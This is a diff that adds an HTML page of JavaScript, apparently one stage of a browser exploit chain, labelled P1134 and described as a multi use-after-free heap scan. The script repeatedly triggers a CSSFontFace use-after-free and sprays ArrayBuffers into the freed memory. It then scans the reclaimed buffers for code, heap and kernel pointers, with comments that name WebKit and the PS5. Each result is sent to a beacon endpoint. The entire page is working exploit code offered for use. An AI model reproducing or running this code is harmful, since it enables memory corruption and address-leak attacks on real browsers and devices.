@@ -1,0 +1,211 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1134</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1134: MULTI-UAF HEAP SCAN ===');
+log('info','Trigger 30 CSSFontFace UAFs → 30 heap windows → scan for vtable/code ptrs');
+B('P1134-START','t='+Date.now());
+
+var TOTAL_UAFS=30;
+var SPRAY_PER=10; // 10 ArrayBuffers per UAF attempt
+var SIZE=192;
+
+var windows=[]; // {idx, bi, view, q11, q13} for each hit
+var attempts=0;
+var done=false;
+
+function triggerUAF(idx,callback){
+  var r=Date.now()%100000+idx*1000;
+  var fired=false,map=null,found=false;
+
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:m"+r+";src:local(Arial);unicode-range:U+00"+(42+idx).toString(16)+"}";
+  document.head.appendChild(st);
+  var ff=new FontFace('n'+r,'local(Helvetica)',{unicodeRange:'U+00'+(41+idx).toString(16)});
+  document.fonts.add(ff);void ff.loaded;
+
+  var thenProp='then';
+  Object.defineProperty(FontFace.prototype,thenProp,{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    if(st.parentNode)st.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    map=[];
+    for(var i=0;i<SPRAY_PER;i++){
+      map.push(new ArrayBuffer(SIZE));
+    }
+    try{document.fonts.check('1em m'+r);}catch(e){}
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em n'+r+', m'+r,'AB').then(function(){},function(){});
+
+  // Scan at ms=5 (optimal timing from P1128)
+  setTimeout(function(){
+    delete FontFace.prototype[thenProp];
+    if(!map){callback(idx,null);return;}
+
+    for(var bi=0;bi<map.length;bi++){
+      var b=new BigUint64Array(map[bi]);
+      if(b[0]===1n&&b[11]!==0n&&b[13]!==0n){
+        var h11=Number(b[11]>>32n),h13=Number(b[13]>>32n);
+        if(h11>=0x10&&h11<=0xFF&&h13>=0x10&&h13<=0xFF){
+          var allZ=true;
+          for(var z=1;z<=10;z++)if(b[z]!==0n){allZ=false;break;}
+          if(allZ&&b[12]===0n){
+            callback(idx,{idx:idx,bi:bi,view:b,ab:map[bi],q11:b[11],q13:b[13]});
+            return;
+          }
+        }
+      }
+    }
+    callback(idx,null);
+  },8);
+}
+
+// Chain UAF triggers sequentially
+var uafQueue=[];
+for(var i=0;i<TOTAL_UAFS;i++)uafQueue.push(i);
+
+var queueIdx=0;
+function processQueue(){
+  if(queueIdx>=uafQueue.length||done){
+    finishScan();
+    return;
+  }
+
+  var idx=uafQueue[queueIdx++];
+  triggerUAF(idx,function(i,result){
+    attempts++;
+    if(result){
+      windows.push(result);
+      log('ptr','UAF #'+i+': q11='+hex64(result.q11)+' q13='+hex64(result.q13));
+    }
+    // Small delay between UAFs to let heap settle
+    setTimeout(processQueue,15);
+  });
+}
+
+processQueue();
+
+function finishScan(){
+  if(done)return;done=true;
+
+  log('phase','=== '+windows.length+'/'+attempts+' UAF hits ===');
+  B('P1134-HITS','total='+windows.length+'|attempts='+attempts);
+
+  if(windows.length===0){
+    B('P1134-DONE','no_hits');
+    log('fail','No UAF hits this boot');
+    return;
+  }
+
+  // === ANALYSIS 1: Address clustering ===
+  var q11addrs=[],q13addrs=[];
+  for(var i=0;i<windows.length;i++){
+    q11addrs.push(windows[i].q11);
+    q13addrs.push(windows[i].q13);
+  }
+
+  // Sort q11 addresses
+  q11addrs.sort(function(a,b){return a<b?-1:a>b?1:0;});
+  var q11gaps=[];
+  for(var i=1;i<q11addrs.length;i++){
+    var gap=Number(q11addrs[i]-q11addrs[i-1]);
+    q11gaps.push(gap);
+  }
+
+  B('P1134-Q11','addrs='+q11addrs.map(hex64).join(','));
+  B('P1134-Q11-GAPS','gaps='+q11gaps.join(','));
+  log('info','q11 range: '+hex64(q11addrs[0])+' - '+hex64(q11addrs[q11addrs.length-1]));
+  if(q11gaps.length>0)log('info','q11 gaps: min='+Math.min.apply(null,q11gaps)+' max='+Math.max.apply(null,q11gaps));
+
+  // === ANALYSIS 2: Cross-window adjacency test ===
+  // Write unique marker to each window, check if any other window sees it
+  for(var i=0;i<windows.length;i++){
+    var w=windows[i];
+    // Write marker at qword 23 (last qword, which is always 0)
+    w.view[23]=BigInt('0xFACE'+(i).toString(16).padStart(12,'0'));
+  }
+
+  var adjacencies=[];
+  for(var i=0;i<windows.length;i++){
+    var w=windows[i];
+    // Check if this window sees another window's marker
+    for(var q=0;q<24;q++){
+      var v=w.view[q];
+      if(v!==0n){
+        var vh=Number(v>>48n);
+        if(vh===0xFACE){
+          var srcIdx=Number(v&BigInt('0xFFFFFFFFFFFF'));
+          if(srcIdx!==i){
+            adjacencies.push({from:srcIdx,to:i,offset:q});
+            log('win','ADJACENT! window['+srcIdx+'] visible from window['+i+'] at q'+q);
+          }
+        }
+      }
+    }
+  }
+
+  B('P1134-ADJACENT','count='+adjacencies.length);
+
+  // === ANALYSIS 3: Scan each window for code pointers ===
+  // Code pointers have high bits 0x200-0x7FFF (typical WebKit code segment)
+  var codeLeaks=[];
+  for(var i=0;i<windows.length;i++){
+    var w=windows[i];
+    // Restore original data first
+    w.view[23]=0n;
+
+    // Re-read and check for code-range pointers
+    for(var q=0;q<24;q++){
+      var v=w.view[q];
+      if(v!==0n&&q!==0){ // Skip refcount
+        var h=Number(v>>32n);
+        // Code pointers: 0x200-0x7FFF prefix (typical on PS5)
+        // Also check for vtable pattern: first qword of an object
+        if(h>=0x200&&h<=0x7FFF){
+          codeLeaks.push({win:i,q:q,val:hex64(v),tag:'CODE'});
+          log('win','CODE PTR! win['+i+'] q'+q+'='+hex64(v));
+        }
+        // Check for kernel pointers too
+        if(h>=0xFFFF8000){
+          codeLeaks.push({win:i,q:q,val:hex64(v),tag:'KERN'});
+          log('win','KERNEL PTR! win['+i+'] q'+q+'='+hex64(v));
+        }
+      }
+    }
+  }
+
+  B('P1134-CODE','count='+codeLeaks.length);
+  if(codeLeaks.length>0){
+    B('P1134-CODE-DETAIL',codeLeaks.map(function(l){return l.win+'.q'+l.q+'='+l.val+'('+l.tag+')';}).join(','));
+  }
+
+  // === ANALYSIS 4: Write pattern to all windows, then scan for stale refs ===
+  // This tests if freeing one CSSFontFace puts its memory near another's
+  for(var i=0;i<windows.length;i++){
+    // Write unique pattern across entire window
+    for(var q=0;q<24;q++){
+      windows[i].view[q]=BigInt('0x'+i.toString(16).padStart(4,'0')+q.toString(16).padStart(4,'0')+'DEAD0000');
+    }
+  }
+
+  // === FINAL REPORT ===
+  var summary={
+    hits:windows.length,
+    attempts:attempts,
+    adjacencies:adjacencies.length,
+    codeLeaks:codeLeaks.length,
+    q11Range:q11addrs.length>0?hex64(q11addrs[0])+'-'+hex64(q11addrs[q11addrs.length-1]):'none'
+  };
+
+  B('P1134-DONE',JSON.stringify(summary));
+  log('phase','=== FINAL: '+JSON.stringify(summary)+' ===');
+}
+</script></body></html>
